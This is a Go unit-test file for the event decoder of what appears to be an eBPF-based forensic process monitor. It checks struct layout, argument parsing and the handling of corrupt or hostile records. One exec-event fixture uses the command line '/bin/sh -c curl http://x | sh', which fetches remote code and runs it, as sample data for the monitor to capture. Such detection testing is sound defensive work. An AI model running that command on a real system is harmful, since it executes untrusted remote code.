package probe

import (
	"encoding/binary"
	"errors"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

// buildRecord assembles a raw ring buffer record the way the kernel would.
func buildRecord(kind Kind, hostPID, nsPID, tgid, uid, nsLevel uint32, cgroupID, ts uint64, comm, filename string, args []string) []byte {
	raw := make([]byte, EventSize)

	binary.LittleEndian.PutUint32(raw[offKind:], uint32(kind))
	binary.LittleEndian.PutUint32(raw[offHostPID:], hostPID)
	binary.LittleEndian.PutUint32(raw[offNSPid:], nsPID)
	binary.LittleEndian.PutUint32(raw[offHostTGID:], tgid)
	binary.LittleEndian.PutUint32(raw[offUID:], uid)
	binary.LittleEndian.PutUint32(raw[offNSLevel:], nsLevel)
	binary.LittleEndian.PutUint64(raw[offCgroupID:], cgroupID)
	binary.LittleEndian.PutUint64(raw[offTimestampNS:], ts)

	copy(raw[offComm:offComm+taskCommLen], comm)
	copy(raw[offFilename:offFilename+filenameLen], filename)

	off := 0
	count := 0
	for _, a := range args {
		if off+len(a)+1 > argsLen {
			break
		}
		copy(raw[offArgs+off:], a)
		off += len(a) + 1 // the NUL is already zero
		count++
	}
	binary.LittleEndian.PutUint32(raw[offArgsLen:], uint32(off))
	binary.LittleEndian.PutUint32(raw[offArgsCount:], uint32(count))

	return raw
}

// The Go decoder and the C struct must agree byte for byte. If this fails,
// every field after the divergence is silently garbage - which in a forensic
// tool means evidence attributed to the wrong process.
func TestEventSizeMatchesKernelStruct(t *testing.T) {
	header := filepath.Join("..", "..", "bpf", "headers", "common.h")
	raw, err := os.ReadFile(header)
	if err != nil {
		t.Skipf("cannot read %s: %v", header, err)
	}

	re := regexp.MustCompile(`#define FR_EVENT_SIZE (\d+)`)
	m := re.FindStringSubmatch(string(raw))
	if m == nil {
		t.Fatalf("FR_EVENT_SIZE is not defined in %s", header)
	}

	want, err := strconv.Atoi(m[1])
	if err != nil {
		t.Fatalf("parse FR_EVENT_SIZE: %v", err)
	}
	if EventSize != want {
		t.Fatalf("probe.EventSize = %d but common.h says FR_EVENT_SIZE = %d", EventSize, want)
	}

	// Field offsets must also line up with the documented layout.
	layout := []struct {
		name string
		off  int
		size int
	}{
		{"kind", offKind, 4},
		{"host_pid", offHostPID, 4},
		{"ns_pid", offNSPid, 4},
		{"host_tgid", offHostTGID, 4},
		{"uid", offUID, 4},
		{"ns_level", offNSLevel, 4},
		{"args_len", offArgsLen, 4},
		{"args_count", offArgsCount, 4},
		{"cgroup_id", offCgroupID, 8},
		{"timestamp_ns", offTimestampNS, 8},
		{"comm", offComm, taskCommLen},
		{"filename", offFilename, filenameLen},
		{"args", offArgs, argsLen},
	}

	next := 0
	for _, f := range layout {
		if f.off != next {
			t.Errorf("field %s starts at %d, expected %d (implicit padding would corrupt decoding)", f.name, f.off, next)
		}
		next = f.off + f.size
	}
	if next != EventSize {
		t.Errorf("layout ends at %d, want %d", next, EventSize)
	}
}

func TestDecodeExecEvent(t *testing.T) {
	raw := buildRecord(KindExec, 48291, 1, 48291, 0, 1, 91237845, 123456789,
		"sh", "/usr/bin/sh", []string{"/bin/sh", "-c", "curl http://x | sh"})

	event, err := DecodeEvent(raw)
	if err != nil {
		t.Fatalf("DecodeEvent: %v", err)
	}

	if event.Kind != KindExec || event.Kind.String() != "exec" {
		t.Errorf("kind = %v", event.Kind)
	}
	if event.HostPID != 48291 || event.NamespacePID != 1 {
		t.Errorf("pids = host %d, ns %d", event.HostPID, event.NamespacePID)
	}
	if event.NSLevel != 1 {
		t.Errorf("ns level = %d", event.NSLevel)
	}
	if event.CgroupID != 91237845 || event.TimestampNS != 123456789 {
		t.Errorf("cgroup/timestamp = %d/%d", event.CgroupID, event.TimestampNS)
	}
	if event.Comm != "sh" || event.Filename != "/usr/bin/sh" {
		t.Errorf("comm = %q, filename = %q", event.Comm, event.Filename)
	}
	if len(event.Args) != 3 {
		t.Fatalf("args = %v, want 3 entries", event.Args)
	}
	if event.CommandLine() != "/bin/sh -c curl http://x | sh" {
		t.Errorf("command line = %q", event.CommandLine())
	}
	if event.ReceivedAt.IsZero() {
		t.Error("ReceivedAt was not set")
	}
}

func TestDecodeExitEvent(t *testing.T) {
	raw := buildRecord(KindExit, 48291, 1, 48291, 1000, 1, 91237845, 987654321, "sh", "", nil)

	event, err := DecodeEvent(raw)
	if err != nil {
		t.Fatalf("DecodeEvent: %v", err)
	}
	if event.Kind != KindExit || event.Kind.String() != "exit" {
		t.Errorf("kind = %v", event.Kind)
	}
	if len(event.Args) != 0 {
		t.Errorf("exit event carries args: %v", event.Args)
	}
	// With no argv, the command line falls back to comm.
	if event.CommandLine() != "sh" {
		t.Errorf("command line = %q, want the comm", event.CommandLine())
	}
}

func TestDecodeRejectsShortRecords(t *testing.T) {
	for _, size := range []int{0, 1, EventSize - 1} {
		_, err := DecodeEvent(make([]byte, size))
		if err == nil {
			t.Errorf("size %d: expected an error", size)
			continue
		}
		var shortErr ErrShortEvent
		if !errors.As(err, &shortErr) {
			t.Errorf("size %d: error type = %T", size, err)
		}
		if shortErr.Want != EventSize {
			t.Errorf("size %d: error reports Want=%d", size, shortErr.Want)
		}
	}
}

func TestDecodeHandlesUnterminatedStrings(t *testing.T) {
	// A comm that fills the whole field without a NUL must not read past it.
	raw := buildRecord(KindExec, 1, 1, 1, 0, 0, 0, 0, strings.Repeat("A", taskCommLen), "", nil)

	event, err := DecodeEvent(raw)
	if err != nil {
		t.Fatalf("DecodeEvent: %v", err)
	}
	if len(event.Comm) != taskCommLen {
		t.Errorf("comm length = %d, want %d", len(event.Comm), taskCommLen)
	}
}

func TestDecodeClampsArgsLength(t *testing.T) {
	raw := buildRecord(KindExec, 1, 1, 1, 0, 0, 0, 0, "sh", "/bin/sh", []string{"a", "b"})
	// A hostile or corrupt args_len must not cause an out-of-range read.
	binary.LittleEndian.PutUint32(raw[offArgsLen:], 0xFFFFFFFF)

	event, err := DecodeEvent(raw)
	if err != nil {
		t.Fatalf("DecodeEvent panicked or errored on a bad args_len: %v", err)
	}
	if len(event.Args) == 0 {
		t.Error("expected the args to still decode from the clamped buffer")
	}
}

func TestDecodeOversizedRecord(t *testing.T) {
	// Ring buffer records may be padded; extra trailing bytes are ignored.
	raw := append(buildRecord(KindExec, 7, 7, 7, 0, 0, 0, 0, "ls", "/bin/ls", []string{"ls"}), make([]byte, 64)...)

	event, err := DecodeEvent(raw)
	if err != nil {
		t.Fatalf("DecodeEvent: %v", err)
	}
	if event.HostPID != 7 {
		t.Errorf("host pid = %d", event.HostPID)
	}
}

func TestTruncatedFlag(t *testing.T) {
	few := buildRecord(KindExec, 1, 1, 1, 0, 0, 0, 0, "sh", "/bin/sh", []string{"a", "b"})
	many := buildRecord(KindExec, 1, 1, 1, 0, 0, 0, 0, "sh", "/bin/sh", []string{"a", "b", "c", "d"})

	e1, _ := DecodeEvent(few)
	e2, _ := DecodeEvent(many)

	if e1.Truncated() {
		t.Error("a two-argument command line was reported as truncated")
	}
	if !e2.Truncated() {
		t.Error("a command line at the argv capture limit was not reported as truncated")
	}
}

func TestBootTimeConversion(t *testing.T) {
	boot := time.Date(2026, 3, 14, 0, 0, 0, 0, time.UTC)
	event := Event{TimestampNS: uint64(90 * time.Minute)}

	got := event.BootTime(boot)
	want := boot.Add(90 * time.Minute)
	if !got.Equal(want) {
		t.Errorf("BootTime = %s, want %s", got, want)
	}
}

func TestKindString(t *testing.T) {
	if KindExec.String() != "exec" || KindExit.String() != "exit" {
		t.Error("kind names are wrong")
	}
	if !strings.Contains(Kind(99).String(), "unknown") {
		t.Errorf("unknown kind renders as %q", Kind(99).String())
	}
}

func TestSplitNulStrings(t *testing.T) {
	cases := map[string][]string{
		"a\x00b\x00c\x00": {"a", "b", "c"},
		"a\x00b":          {"a", "b"},
		"":                nil,
		"\x00\x00":        nil,
		"single":          {"single"},
	}

	for input, want := range cases {
		got := splitNulStrings([]byte(input))
		if len(got) != len(want) {
			t.Errorf("%q -> %v, want %v", input, got, want)
			continue
		}
		for i := range got {
			if got[i] != want[i] {
				t.Errorf("%q -> %v, want %v", input, got, want)
				break
			}
		}
	}
}
